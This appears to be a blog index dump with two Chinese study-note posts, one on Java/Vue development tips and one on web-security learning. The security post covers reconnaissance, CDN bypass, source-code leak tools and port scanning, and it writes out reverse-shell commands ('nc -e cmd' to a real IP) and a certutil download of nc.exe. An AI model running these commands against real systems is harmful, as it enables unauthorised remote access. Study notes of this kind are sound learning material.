[{"title":"java 学习笔记","url":"/2025/01/03/java-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"NOW、待做1.给blog加上评论，需要完善…..2.普通用户，最开始注册的时候没有填写个人信息，导致home界面无法显示个人中心的数据\n2.页面的鉴权功能（限制进入人员管理页面）（完成一半：非管理人员无法修改数据）\n3.将CodePen中的钟表加在主页\n4.对blog中简历界面，增加一个功能，通过在线填写数据，传给后端后返回一个pdf的简历\n5.引入redis和Es\n6.通过windows的定时任务，定时删除数据库中的oldFile（图片&#x2F;pdf）需求描述：在数据库中存储文件的表中加上一个字段 ‘status’ ，值为0或1，0代表该文件为oldFile,在定时任务中进行删除，否则不删除\n7.完善一些细节，比如文件的逻辑删除，loading界面等等\n一、git实现同时对接github和gitee？原文网址具体操作：\n\n生成 key，将邮件地址替换为你 Gitee 或者 Github 使用的邮件地址\n#生成 key，将邮件地址替换为你 Gitee 或者 Github 使用的邮件地址#注意：在生成密钥时不要输入密码，直接回车即可，不然之后每次连都需要输入密码ssh-keygen -t rsa -C &quot;xxx@xxx.com&quot;\n\n将生成的公钥，配置到gitee及github各自账户下\n\n在.ssh目录下新建config.txt文件，编辑配置内容如下，去掉后缀保存文件名为config\n# giteeHost gitee.comHostName gitee.comPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsa_gitee # githubHost github.comHostName github.comPreferredAuthentications publickeyIdentityFile ~/.ssh/id_rsa_github\n\n二、Vue2的相关使用vue2 cli的相关文档    注意：            1.在进行vue cli的安装之前需要有node环境            2.安装nodejs时需要自己创建俩个文件夹（cache和global，不要设置错了）,并利用node命令对着俩个文件夹进行设置，同时记得设置成淘宝镜像\t\t\t（以上涉及得命令自行百度）\n1.npm的相关命令\nnpm config list : 列出相关的配置信息\nnpm config set registry https://registry.npm.taobao.org ：设置淘宝镜像\n\n三、Maven中其它项目引入公共依赖common，但是其中的依赖无法传递？​\t\t检查common中依赖是否忘记添加版本号，一般都是common中的依赖项出现了问题，导致依赖无法传递\n四、CORS跨域问题的解决@Configurationpublic class XmixCorsConfig &#123;    // 该配置适用于reactive响应式环境    @Bean    public CorsWebFilter corsFilter() &#123;        CorsConfiguration config = new CorsConfiguration();        config.addAllowedHeader(&quot;*&quot;);        config.addAllowedMethod(&quot;*&quot;);        // springboot升级成2.4.0以上时对AllowedOrigin设置发生了改变，不能有”*“,可以替换成AllowedOriginPattern        config.addAllowedOriginPattern(&quot;*&quot;);        config.setAllowCredentials(true);        // 必须是reactive包下的UrlBasedCorsConfigurationSource        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource(new PathPatternParser());        source.registerCorsConfiguration(&quot;/**&quot;, config);        return new CorsWebFilter(source);    &#125;&#125;\n\n五、后端给前端返回实体类时想要忽略实体类中的某个属性？1.在返回的实体类中需要忽略的属性上加上下面注解即可@JsonIgnore  缺点：后端在用相同的实体类接收前端的参数时，该属性也不会被注入2.使用下面的注解可以完美解决@JsonProperty(access = JsonProperty.Access.WRITE_ONLY)   //确保该属性只能写入@JsonProperty(access = JsonProperty.Access.READ_ONLY)   //确保该属性只能读\n\n六、VUE2不能检测通过数组索引值直接修改一个数组项。无法响应式做出反应var vm = new Vue(&#123;  data: &#123;    items: [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]  &#125;&#125;)vm.items[1] = &#x27;x&#x27; // 不是响应性的//解决方式   参考博客：https://blog.csdn.net/m0_55333789/article/details/132183715//注意：list的push,pop,unshift,reserve,sort等都是响应式的，但是map和filter不是//Vue.set  第一种Vue.set(vm.items,indexOfItem,newValue); //vm.$set  第二种vm.$set(vm.items,indexOfItem,newValue); //Array.prototype.splice  第三种vm.items.splice(indexOfItem,1,newValue);\n\n七、将数据导出成Excel并响应回浏览器让用户下载public void exportAll(HttpServletResponse response) throws IOException &#123;        //查询出所有的数据        List&lt;Role&gt; list = this.list();        ExcelWriter writer = null;        ServletOutputStream out = null;        try &#123;            //使用工具类将查询出的所有数据导出成excel            writer = ExcelUtil.getWriter(true);            writer.write(list,true);            //设置浏览器的响应格式，让用户下载导出的数据            response.setContentType(&quot;application/vnd.openxmlformats-officedocument.spreadsheetml.sheet;charset=utf-8&quot;);            String fileName = URLEncoder.encode(&quot;用户信息&quot;,&quot;UTF-8&quot;);            response.setHeader(&quot;Content-Disposition&quot;,&quot;attachment;filename=&quot;+fileName+&quot;.xlsx&quot;);            //创建一个输出流            out = response.getOutputStream();            //将writer中的数据刷新到response的输出流中            writer.flush(out,true);        &#125; catch (Exception e) &#123;            throw new RuntimeException(e);        &#125; finally &#123;            out.close();            writer.close();        &#125;    &#125;\n\n八、修改Element-UI的默认CSS样式1）使用全局统一覆盖（第一种方式）​      针对一些通用的、样式固定的组件，可以全局处理，其方法是新建一个css或者scss文件，覆盖element原有的class。你可以在src/styles目录下新建一个element-ui-reset.scss，根据UI的需要，修改原有的class名称，使用scss的好处是可以使用变量，来应对UI的不同变化比如我们常用的按钮、分页、复选框等组件，在UI中基本都是同样的设计，那么我就就可以统一修改这些样式。\n参考连接\n$danger-btn-color: #F25454;$primary-btn-color:#3d66e4;$success-btn-color:#12A763;//修改默认按钮颜色.el-button--primary&#123;    background-color: $primary-btn-color;    border-radius: 4px;    //border: 1px solid $primary-btn-color;    font-size: 16px;    border: 0;    &#125;//修改危险按钮的颜色.el-button--danger&#123;    background-color: $danger-btn-color;    border-radius: 4px;    //border: 1px solid $danger-btn-color;    font-size: 16px;    border: 0;&#125;//修改成功按钮的颜色.el-button--success&#123;    background-color: $success-btn-color;    border-radius: 4px;    //border: 1px solid $success-btn-color;    font-size: 16px;    border: 0;    &#125;//修改默认按钮的颜色.el-button--default&#123;    font-size: 16px;    border-radius: 4px;&#125;//修改成功按钮的颜色.el-button--warning&#123;    //background-color: $success-btn-color;    border-radius: 4px;    //border: 1px solid $success-btn-color;    font-size: 16px;    border: 0;    &#125;//修改分页颜色.el-pagination&#123;    position: absolute;    display: inline-block;    margin: 0 auto;    left:50%;    transform: translateX(-50%);    background-color: #fafafa;    border: solid 1px #dfe8eb;    padding: 0 !important;    .el-pager&#123;        margin: 0 !important;        .number&#123;            color: #3d66e4 !important;            border-left: 1px solid #dfe8eb;            border-right: 1px solid #dfe8eb;            background-color: #fafafa !important;            &amp;.active&#123;                color: #fff !important;                //border: 1px  solid  #3d66e4;                background-color: #3d66e4 !important;                border: 1px solid #3d66e4 !important;            &#125;        &#125;            &#125;    &#125;\t.el-pagination.is-background .btn-next, .el-pagination.is-background .btn-prev, .el-pagination.is-background .el-pager li&#123;    margin: 0 !important;    background-color: #fafafa !important;&#125;//修改checkbox.el-checkbox__inner&#123;      border: 1px solid #C0C0C0 ;      width: 16px;      height: 16px;      border-radius: 0;&#125;//接着在main.js中引入自定义的样式/*优点：1.全局覆盖，省事2.使用scss更加灵活3.可以随时删除样式的覆盖缺点：1.局部修改时需要重新覆盖2.所有被修改的组件样式都是一样的*/\n\n2）直接在.vue文件中修改（第二种方式）​        直接通过在需要修改的标签的外围套上另一个标签，通过自己套上的标签去访问vue中组件的class属性并对其样式进行修改，注意：加上外层的作用域可以限定样式的作用域，否则会全局覆盖\n&lt;template&gt;    &lt;div class=&quot;my-class&quot;&gt;            &lt;el-table&gt;            &lt;/el-table&gt;        &lt;/div&gt;&lt;/template&gt;&lt;script&gt;&lt;/script&gt;&lt;style scoped=&quot;scoped&quot; lang=&quot;scss&quot;&gt;&lt;/style&gt;&lt;style&gt;        /* 修改element-ui中table组件的样式 */    .my-class__expand-column .cell &#123;            display: none;    &#125;    .my-class .el-table tbody tr:hover&gt;td &#123;            cursor: pointer;    &#125;    .my-class .el-form .el-form-item  .el-input__inner:focus&#123;             border: 1px solid #3D66E4;       &#125;   &lt;/style&gt;/**优点：1.灵活自定义，可以动态绑定2.不会全局修改缺点：1.需要指定唯一的class作用域或者id**/\n\n3）修改组件的style的样式（第三种方式）直接在组件中使用style进行样式的修改，但是修改的样式有限，有些是无法进行修改的\n&lt;el-backtop target=&quot;&quot; :bottom=&quot;100&quot; &gt;      &lt;div :style=&quot;&#123;             height: 100%;             width: _width;             background-color: #f2f5f6;             box-shadow: 0 0 6px rgba(0,0,0, .12);             text-align: center;             line-height: 40px;             color: #1989fa;             border-radius: 50%;           &#125;&quot;&gt;                        &lt;i class=&quot;el-icon-caret-top&quot;&gt;&lt;/i&gt;                &lt;/div&gt;        &lt;/el-backtop&gt;                        data() &#123;                    return&#123;           _width: 50%         &#125;        &#125;\n\n4）参考element-UI的官方文档api其中记录了一些组件样式的修改\n九、解决：下载&#x2F;导出问题（统一返回）：No converter for xxx with preset Content-Type ‘application&#x2F;octet-stream；charset&#x3D;UTF-8正常Spring通过response返回的时候，无法转化 ’application&#x2F;octet-stream‘ ，因此会出现converter找不到的异常，\n因为只是在下载的时候用到，因此直接在下载的接口中删掉设置head为 ’application&#x2F;octet-stream‘ 的代码\n参考连接\n**     * 解决方式一（推荐使用这种）     * 手动返回状态消息     */    @GetMapping(&quot;/d1_1&quot;)    public void d1_1(HttpServletResponse httpServletResponse) &#123;        try &#123;            DownloadHuTool.download2_2(httpServletResponse);        &#125; catch (Exception e) &#123;            e.printStackTrace();            httpServletResponse.reset();            AjaxResult&lt;T&gt; result = new AjaxResult&lt;&gt;(HttpStatus.ERROR, e.getMessage());            String json = JSON.toJSONString(result);            ServletUtils.renderString(httpServletResponse, json);        &#125;    &#125;/**     * 将字符串渲染到客户端     *     * @param response 渲染对象     * @param string   待渲染的字符串     */    public static void renderString(HttpServletResponse response, String string) &#123;        try &#123;            response.setStatus(200);            response.setContentType(&quot;application/json&quot;);            response.setCharacterEncoding(&quot;utf-8&quot;);            response.getWriter().print(string);        &#125; catch (IOException e) &#123;            e.printStackTrace();        &#125;    &#125;\n\n十、Flex布局详解参考连接\n\n十一、Vue前端预览PDF以及对PDF进行操作**注意：有坑，避坑请看原文 ** （最好安装4.0.7版本）\n参考链接\n1）安装依赖npm/yarn i/add vue-pdf//需要在Vue2的环境下，且版本需要对应npm install pdfjs-dist@2.5.207 -gnpm install vue-pdf@4.2.0 -g --registry=https://registry.npm.taobao.org\n\n2）单文件组件导入并注册// 单组件引用import pdf from &#x27;vue-pdf&#x27; // 然后在component中进行注册components: &#123;  pdf&#125;,\n\n3）界面中使用参考文档\n// 点击分页&lt;div&gt;  &lt;el-button size=&quot;small&quot; type=&quot;primary&quot;  @click=&quot;changePdfPage(0)&quot; class=&quot;turn&quot; :class=&quot;&#123;grey: currentPage==1&#125;&quot;&gt;上一页&lt;/el-button&gt;  &#123;&#123;currentPage&#125;&#125; / &#123;&#123;pageCount&#125;&#125;  &lt;el-button size=&quot;small&quot; type=&quot;primary&quot;  @click=&quot;changePdfPage(1)&quot; class=&quot;turn&quot; :class=&quot;&#123;grey: currentPage==pageCount&#125;&quot;&gt;下一页&lt;/el-button&gt;&lt;/div&gt;&lt;div class=&quot;content&quot; ref=&quot;printContent&quot;&gt;  &lt;pdf    id=&quot;myIframe&quot;    ref=&quot;pdfDom&quot;    :src=&quot;pdfSrc&quot;     :page=&quot;currentPage&quot;     @num-pages=&quot;pageCount=$event&quot; // PDF文件总页码    @page-loaded=&quot;currentPage=$event&quot; // 一开始加载的页面    @loaded=&quot;loadPdfHandler&quot;&gt; // 加载事件  &lt;/pdf&gt;&lt;/div&gt;// 声明变量data() &#123;  return &#123;    pdfSrc: &#x27;&#x27;, // pdf文件src    pageCount: 0, // pdf文件总页数    currentPage: 1, // pdf文件页码  &#125;&#125;,// 获取文件流和文件总页数 async getFileInfo() &#123;  let formData = new FormData();  formData.append(&#x27;wjid&#x27;, this.wjid)  formData.append(&#x27;yhid&#x27;, this.userId)  let res = await getFileBuffer(formData)  if(res.status === 200)&#123;    const blob = new Blob([res.data])    let pageRes = await getFilePages(formData)    this.pdfSrc = URL.createObjectURL(blob)    this.pageCount = pageRes.data.content  &#125;else&#123;    this.$message(&#123;        message: res.message,        type: &#x27;error&#x27;    &#125;);  &#125;&#125;,// 改变PDF页码,val传过来区分上一页下一页的值,0上一页,1下一页changePdfPage (val) &#123;  if (val === 0 &amp;&amp; this.currentPage &gt; 1) &#123;    this.currentPage--  &#125;  if (val === 1 &amp;&amp; this.currentPage &lt; this.pageCount) &#123;    this.currentPage++  &#125;&#125;,// pdf加载时loadPdfHandler (e) &#123;  this.currentPage = 1 // 加载的时候先加载第一页&#125;,\n\n十二、查看npm镜像以及npm镜像安装npm config get registry   //查看镜像npm install xxx@xxxx -g --registry=https://registry.npm.taobao.org\t//全局镜像安装npm uninstall xxxx@xxxx -g  //全局模块卸载\n\n十三、Vue中防抖功能的实现参考链接\n// 在Vue组件的methods中定义一个需要防抖的函数methods: &#123;  // 防抖函数  debounceFunction: function() &#123;    // 清除之前的定时器    clearTimeout(this.timer);    // 设置新的定时器    this.timer = setTimeout(() =&gt; &#123;      // 在定时器结束时执行函数逻辑      console.log(&#x27;执行防抖函数的逻辑&#x27;);    &#125;, 500); // 设置防抖的时间间隔，例如500毫秒  &#125;&#125;mounted() &#123;  this.timer = null; // 初始化定时器&#125;\n\n十四、java对pdf文件的处理，包括读取、写入、修改和提取pdf文件的内容具体的内容见参考链接\n具体的实操的参考链接\n1）方法1：使用PDFBox库（需要引入依赖的）2）方法2：使用iText库 （需要引入依赖）十五、当我们希望后端返回给前端的数据为二进制时（例如在页面上显示pdf），可以在get请求后带上一个参数，该参数代表我们希望从后端获取什么样的数据类型，该值默认为stringthis.request.get(&#x27;/manager/file/9a9b07bdf0c9498eb0f248a50e2ee165.pdf&#x27;,        &#123;          responseType:&#x27;blob&#x27;        &#125;        ).then(        res =&gt; &#123;         //处理响应         //拿到传回的二进制数据,并形成一个url映射(其中res为后台返回的二进制数据)          const url = URL.createObjectURL(res)        &#125;        )\n\n十六、Vue中设置访问地址为本地回环地址127.0.0.1//   &#x27;/node_modules/@vue/cli-service/lib/commands/serve.js&#x27;//通过上面的路径找到文件，修改下面的host即可const defaults = &#123;  host: &#x27;0.0.0.0&#x27;,  port: 8080,  https: false&#125;\n\n十七、使用vue-pdf报错Rendering cancelled, page 1/*给pdf 直接加上高度即可，最好是直接给vue-pdf 设置宽高*/.pdf-view&#123;  width: 100%;  height: 450px;&#125;\n\n十八、java中的异步编排1）将线程池中得参数都配置在配置文件中，将所有的配置文件封装成一个properties类，并和配置文件中的参数进行绑定//1.properties类@ConfigurationProperties(prefix = &quot;gulimall.thread&quot;)   //定义配置参数的前缀//@Component  //若是配置类中指定了properties文件的类对象，则这里可以不用注册到容器中@Datapublic class ThreadPoolConfigProperties &#123;    /**    核心线程数：能够一直存在，不会被回收    **/    private Integer coreSize;     /**    最大线程数：当运行的线程超过核心线程数时，再次提交的任务会进入队列等待，但当队列满了时，此时就会创建新的线程（非核心线程）\t来执行任务而非核心线程数以及存在的核心线程俩者加起来不能超过最大线程数    **/    private Integer maxSize; //最大线程数，空闲的线程（最大线程数-核心线程数），当运行的线程大于核心线程数但是小于最大线程数    /**    非核心线程的存活时间（核心线程不会被回收，但是非核心线程需要回收）    **/    private Integer keepAliveTime;&#125;//2.线程池的配置类@EnableConfigurationProperties(ThreadPoolConfigProperties.class) //写了这个就可以不用在properties中写@Component@Configurationpublic class MyThreadConfig &#123;    @Bean    public ThreadPoolExecutor threadPoolExecutor(ThreadPoolConfigProperties pool)&#123;       return new ThreadPoolExecutor(                pool.getCoreSize(),                pool.getMaxSize(),               pool.getKeepAliveTime(),                TimeUnit.SECONDS,                new LinkedBlockingQueue&lt;&gt;(100000),  //等待的队列                Executors.defaultThreadFactory(),   //创建线程的工厂                new ThreadPoolExecutor.AbortPolicy()  //停止线程的策略        );    &#125;&#125;//3.在配置文件中配置线程池的参数#线程池的相关配置gulimall.thread.core-size=20gulimall.thread.max-size=200gulimall.thread.keep-alive-time=10//在定义自己的配置的时候，若是需要在yml文件中有提示的话，可以加上下面的依赖&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-configuration-processor&lt;/artifactId&gt;    &lt;optional&gt;true&lt;/optional&gt;&lt;/dependency&gt;\n\n2）异步编排库的使用（CompletableFuture）\n//注入创建好的线程池@AutowiredThreadPoolExecutor executor;//第一个任务，supplyAsync方法可以有返回CompletableFuture&lt;任务1返回的类型&gt; infoFuture = CompletableFuture.supplyAsync((任务1),executor)//第二个任务，利用上面的返回进行下一个任务2，thenAcceptAsync没有返回值CompletableFuture&lt;Void&gt; saleAttrFuture = infoFuture.thenAcceptAsync((res)-&gt;&#123;任务2&#125;,executor)//第三个任务，无需上面俩个任务的返回，直接创建一个新的线程runAsync()无返回CompletableFuture&lt;Void&gt; imageFuture = CompletableFuture.runAsync(任务三,executor)//等待所有任务的完成CompletableFuture.allOf(saleAttrFuture,descFuture,baseAttrFuture,imageFuture).get();\n\n十九、MyBatis自定义查询结果–&gt;java对象的映射/**注意：以下方法需要获取到sqlSession对象，由于在Spring的环境下，SqlSession对象是由Spring管理的，而Spring则是通过SqlSessionTemplate进行操作的，因此我们需要注入一个SqlSessionTemplate对象，并利用它来指定我们自定义的ResultSetHandler,具体见下操作**/@AutowiredSqlSessionTemplate sqlSession;private void OurServiceCode()&#123;    //创建MyResultSetHandler实例   MyResultHandler handler = new MyResultHandler()   //执行查询   sqlSession.select(&quot;配置文件中语句的id&quot;,handler)&#125;public class MyResultHandler implements &#123;    @Override    public void handleResult(ResultContext context) &#123;        // 获取当前行的原始结果        Object row = context.getResultObject();        // 判断是否满足条件        if (/* 满足某个条件 */) &#123;            // 将处理后的结果设置回去            context.setResultObject(row);        &#125;    &#125;&#125;//不能用ResultSetHandlerResultSetHandler：ResultSetHandler是MyBatis的关键类之一，用于对JDBC返回的ResultSet进行映射处理1。它负责将SQL查询的结果集映射到Java对象。这包括列前缀处理，逻辑分页，鉴别器（Discriminator，基于值实现动态映射列）处理等等1。ResultSetHandler在StatementHandler执行过程中构建1。(一句话：用于自定义数据-》java对象的映射)    其中有三个实现方法    1） handleResultSets(Statement stmt)：这个方法是用来处理查询操作的结果集的。当执行完select查询语句之后，MyBatis会将查询得到的结果集交给这个方法完成映射处理1。    2）handleOutputParameters(CallableStatement cs)：这个方法是用来    的。如果你的SQL语句是一个调用存储过程的语句，并且这个存储过程有输出参数，那么这个方法就会被调用。    3）handleCursorResultSets(Statement stmt)：这个方法是用来处理游标类型的结果集的。如果你的SQL语句返回了一个游标类型的结果集，那么这个方法就会被调用。//能用ResultHandler&lt;泛型&gt;  泛型需要是数据库对应的实体类，且对应的mapper接口中的方法应该返回void（xml中的resultType还是要的）,不然会失效，因为ResultHandler是一条一条的获取数据的，且只有select方法带有handler参数，其它方法估计不能使用handler    注意：在自定义的ResultHandler中记得保存每条数据（new Map并返回），不然由于mapper接口返回的是void，最后获取不到想要的数据ResultHandler：ResultHandler相当于数据结果集的处理器，它是一个回调函数（Callback），用来处理每一行数据的结果2。这个回调函数可以在查询结果处理到一定量时触发，对结果集数据进行定制化处理2。典型的比如二次过滤或脱敏处理，都可以在这里处理1。（用于控制某行数据是否返回）    @Mapperpublic interface SkillInfoDao extends BaseMapper&lt;SkillInfo&gt; &#123;    void getSkillInfoByUserId(@Param(&quot;userId&quot;) Integer userId,ResultHandler&lt;SkillInfo&gt; handler);    List&lt;SkillInfo&gt; getByUserId(@Param(&quot;userId&quot;) Integer userId);&#125;\n\n二十、MybatisPlus mapper.xml配置文件映射找不到解决方案主要原因：没有配置locations或者在resource下建包时直接用mapper.xxx,这样建的是一个名称为mapper.xxx的文件夹\n参考链接\n","categories":["note"],"tags":["java"]},{"title":"Web安全 学习笔记","url":"/2025/01/03/Web%E5%AE%89%E5%85%A8-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","content":"WEB安全基础概述​\t基础概述中涉及的工具的获取：\n\n名词解释：1.https://www.cnblogs.com/sunny11/p/13583083.html2.封包和抓包的不同之处？  整体和零散的区别，封包能精确到每个操作的数据包\n\n涉及的靶场：1.墨者靶场2.https://www.vulhub.org/\t\tVulhub靶场，常见中间件漏洞：自己搭建靶场\n\n涉及的工具及网站（有一些可能有后门，尽量不要在真实机上使用）：1.Burpsuit  : 抓包工具2.宝塔\t\t: 搭建网站的工具3.快代理\t\t: 配置ip代理4.封包监听工具（傻瓜式）/WPE封包四件套\t：能抓到完成某种操作的一系列数据包集合的工具；普通抓包工具抓到的都是集合中分散的数据包&#x27;&#x27;&#x27;端口扫描工具1.超级ping：CDN服务识别2.Masscan：端口扫描，应用协议3.Wafw00f（比较全）：Web应用防护防火墙识别4.Nmap：端口扫描，应用协议，防火墙识别5.lbd：负载均衡、广域网负载均衡、应用层负载均衡&#x27;&#x27;&#x27;APP分析工具AppInfoScanner（win）\t\t\t#对App进行反编译及资源解析Xposed installer（apk）\t\t#针对一些防止被反编译的App以及加壳的app,一般配合一些脱壳模块一起使用比如xposed模块和frida模块，以及使用JustTrustMe模块预防app证书验证从而防止被抓包Apk资源提取器（Apk）\t\t#提取某个App的资源，比如ICO，MD5，Hash等，接着利用黑暗引擎（如fofa）进行搜索相关资源资产Apk查壳工具（win）\t\t#查询App是否加壳，以及加了哪种壳安卓修改大师（win）\t\t\t#对apk进行资源提取，反编译等一些列操作，并对获取的资源进行修改并重新封装，但是有后门，尽量不要在真实机上使用&#x27;&#x27;&#x27;涉及的网站www.get-site-ip.com\t\t\t\t#用于绕过网站CDN，从而获取真实服务器的ip,结果是否准确需要自己判断\n\n存在漏洞的位置(Web)：1.网站源码：脚本类型、应用方向2.操作系统：windows、linux3.中间件（搭建平台）：apache、iis、tomcat、nginx等    上网查找一些常用中间件漏洞总结4.数据库：access mysql mssql oracle sybase db2 postsql等\n\n实用案例\n文件上传下载—解决无图形化界面&amp;解决数据传输\nlinux: wget curl python ruby java perl 等  具体见棱角社区windows: powershell certutil Bitsadmin msiexec mshta rundll32等   具体见棱角社区\n\n反弹shell命令—-解决数据回显&amp;解决数据通讯\nuseradd 用户名 passwd 密码&#x27;&#x27;&#x27;测试linux系统添加用户或修改密码命令交互回显问题\n\n综合案例\n防火墙绕过—正向连接&amp;反向连接&amp;内网服务器\n\n1.内网：\t内网  -&gt;   xiaodi8\t\t\txiaodi8   !-&gt;  内网\t\t\t（-&gt;  ： 访问）\nnc -e cmd 47.75.212.155 5577   &#x27;&#x27;&#x27;使用nc工具：-e参数：将本地cmd命令权限移交到后面地址的5577端口，结合下面的命令一起使用，实现shellnc -lvvp 5577\t\t\t\t&#x27;&#x27;&#x27;在47.75.212.155上使用该命令，-lvvp参数：监听5577端口注意：只能将内网的cm权限移交给外网，但是外网的权限无法移交给内网（一般情况）\n\n\n\n2.防火墙：  xiaodi8    &lt;-&gt; aliyun      xiaodi8防火墙  -&gt;  aliyun       aliyun  !-&gt;   xiaodi8防火墙\n\n\n\n学会了有手就行-Fofa拿下同行Pikachu服务器\n\n文件下载&amp;反弹shell：\ncertutil -urlcache -split -f http://www.xiaodi8.com/nc.exe nc.exenc -e cmd 47.75.212.155 5566\n\n\n\nWeb应用安全漏洞分类（部分）\nSQL注入\n文件安全\nRCE执行\nXSS跨站\nCSRF&#x2F;SSRF&#x2F;CRLF\n反序列化\n逻辑越权\n未授权访问\nXXE&#x2F;XML\n弱口令安全\n\n基础入门-资产架构\nWeb单个源码指向安全：一个站点对应一套目录源码\nWeb多个目录源码安全：一个站点的目录源码中还包含另一套程序的源码\nWeb多个端口源码安全：一个站点的不同端口对应不同的程序源码\n服务器架设多个站点安全：在一个服务器上搭建多个站点，每个站点对应一个程序源码\n架设第三方插件接口安全：一个服务为了提供更多的功能，安装了第三方的插件，此时第三方插件也有安全问题\n服务器架设多个应用安全：服务器安装其它应用\n\n番外安全：\n基于域名解析安全\n基于服务器本身安全\n基于服务商信息安全\n基于管理个人的安全\n\n考虑阻碍：\n阻碍-站库分离：服务源码与数据库没有布置在同一台服务器上\n阻碍-CDN加速服务：访问节点\n阻碍-负载均衡服务：随机将访问随机分配到一些备用机上的服务\n阻碍-WAF应用防火墙：防止应用程序被攻击\n阻碍-主机防护防火墙：阻止恶意对主机做一些操作\n\n信息打点1.知识点\n打点-Web架构-语言 &amp; 中间件 &amp; 数据库 &amp; 系统等\n打点-Web源码-CMS开源 &amp; 闭源售卖 &amp; 自主研发等\n打点-Web源码获取-泄露安全 &amp; 资源监控 &amp; 其它等\n打点-Web域名-子域名 &amp; 相似域名 &amp; 反查域名 &amp; 旁注等\n\n2.信息点–棱角社区\n基础信息\n系统信息\n应用信息\n防护信息\n人员信息\n其它信息等\n\n3.技术点\nCMS识别\n端口扫描：尽量使用在线网站进行扫描\nCDN绕过\n源码获取\n直接利用公开的漏洞库尝试安全测试\n白盒代码审计 挖漏洞\n例如：mysql 漏洞或弱口令等\nphp 常规漏洞 如log4j\n\n\n\n\n子域名查询\nWAF识别\n负载均衡识别等\n\n4.源码泄露集合\ncomposer.json\ngit 源码泄露\nhg 源码泄露\nsvn 源码泄露\n网站备份压缩文件\nWEB-INF&#x2F;web.xml 泄露\nDS_Store 文件泄露\nSWP 文件泄露\nCVS 泄露\nGitHub 源码泄露\n\n案例演示：\n直接获取-CMS识别-云希指纹识别平台\n\n习惯不好-备份文件-某黑阔博客源码泄露\n\n敏感文件目录扫描-7kbscan-WebPathBrute\nCVS：https://github.com/kost/dvcs-ripper\n\n\n配置不当-GIT泄露-某程序员博客源码泄露：发布时未删除git中的.git文件，那么可以通过.git文件恢复源代码\n\nGit：https://github.com/lijiejie/GitHack\n\n\n配置不当-SVN泄露-某国外小伙子源码泄露：与git类似，未删除.svn/entries文件，那么可以通过该文件获取源代码\n\nSVN：https://github.com/callmefeifei/SvnHack\n\n\n配置不当-DS_Store泄露-某开发Mac源码泄露\n\nDS_Store：https://github.com/lijiejie/de_store_exp\n\n\nPHP特性-composer.json泄露-某直接搭建源码泄露：php包管理工具，记录了当前网站的一些配置信息\n\n下载配合-WEB-INF泄露-RoarCTF-2019-EasyJava\n\n资源监控-GITHUB泄露-语法搜索&amp;关键字搜索&amp;社工\n\n关键字配合谷歌搜索\n\n\n\n关键字配合github搜索\n\n\n\n\n5.系统篇\n网络信息获取-服务厂商&amp;网络架构：获取服务器相关的信息，直接通过在线ip搜索即可\n服务信息获取-协议应用&amp;内网资产\n\n&#x27;&#x27;&#x27;kali中使用nmap工具对某个ip进行端口扫描namp IP/域名 -Pn --osscan-limit -sV&#x27;&#x27;&#x27;kali中使用masscan工具对某个ip进行端口扫描masscan -p1-65535 ip/域名/网段\n\n​\t1）旁注技术：同服务器下面的不同WEB应用查询技术，通过ip反解析出域名（使用在线的一些网站）\n​\t1）C段技术：同网段下面的不同服务器ip下的WEB应用查询技术\n\n阻碍信息获取-CDN&amp;WAF&amp;负载&amp;防火墙\n开启CDN加速服务之后（访问加速），安全测试相当于在对节点进行测试，此时需要找到真实ip\n如何确定是否开启了CDN，使用在线工具超级ping，看全国各地对ip的响应速度以及响应ip，若所有响应ip相同，则大概率没有开启CDN加速，若是各个地区访问后响应的ip不同，则大概率开启了CDN加速\n\n\nCDN知识点\nCDN知识-工作原理及阻碍\n传统访问：用户域名访问-&gt;解析服务器ip-&gt;目标主机\n普通CDN：用户域名访问-&gt;CDN节点-&gt;真实服务器ip-&gt;目标主机\n带WAF的CDN：用户域名访问-&gt;CDN节点（WAF）-&gt;真实服务器ip-&gt;目标主机\n\n\nCDN配置-域名&amp;区域&amp;类型\n配置1：加速域名-需要启用加速的域名\n配置2：加速区域-需要启用加速的地区\n配置3：加速类型-需要启用加速的资源\n\n\nCDN绕过-靠谱十余种技战法\nCDN绑定-HOSTS绑定指向访问\nCDN绕过案例：\n漏洞和遗留文件\n子域名查询操作\n接口查询国外访问：IPIP，超级ping—在线工具\n主动邮件配合备案：让对方主动发邮件给你，比如忘记密码，然后就可以通过邮件种得到对方的ip，或者使用ip地址获取在线工具：get-site-ip.com，查到ip之后再配合备案所在地进一步验证ip的真实性\n全网扫描FuckCDN\n\n\n\n\n\n\n\n6.App信息获取\n外在抓包—Fd&amp;茶杯&amp;Burp\n外在封包—封包监听工具\n内在提取—AppInfoScanner\n内在搜索—反编译载入IDEA\n资源提取—安装包&amp;资源文件\n框架使用—Xposed&amp;JustTrustMe\n小程序—微信—电脑版登陆启动抓包分析\n\n主要思路：利用抓包封包技术获取app资产，接着通过反编译获取代码进行代码审计\n7.工具篇\n网络空间四大引擎：用于搜索关联资产，或者搜索特定资产\nFofa\nQuake\nShodan\nZoomeye\n\n\n自动化信息收集项目：github项目\nARL灯塔\nSuize水泽：比较好\nKunyu坤舆：Zoomeye的升级款，使用的是zoomeye的api\n\n\n单点功能信息收集项目\n企业查\n子域名：one for all —-棱角社区—-工具中心—子域名收集类\n指纹识别\n社工信息\n\n\n工具测评\n四大黑暗引擎集合版项目 ：棱角社区—工具中心—指纹识别—finger\n\n\n工具汇总\n\n1.Burpsuit  : 抓包工具2.宝塔\t\t: 搭建网站的工具3.快代理\t\t: 配置ip代理4.封包监听工具（傻瓜式）/WPE封包四件套\t：能抓到完成某种操作的一系列数据包集合的工具；普通抓包工具抓到的都是集合中分散的数据包&#x27;&#x27;&#x27;端口扫描工具1.超级ping：CDN服务识别2.Masscan：端口扫描，应用协议3.Wafw00f（比较全）：Web应用防护防火墙识别4.Nmap：端口扫描，应用协议，防火墙识别5.lbd：负载均衡、广域网负载均衡、应用层负载均衡&#x27;&#x27;&#x27;APP分析工具AppInfoScanner（win）\t\t\t#对App进行反编译及资源解析Xposed 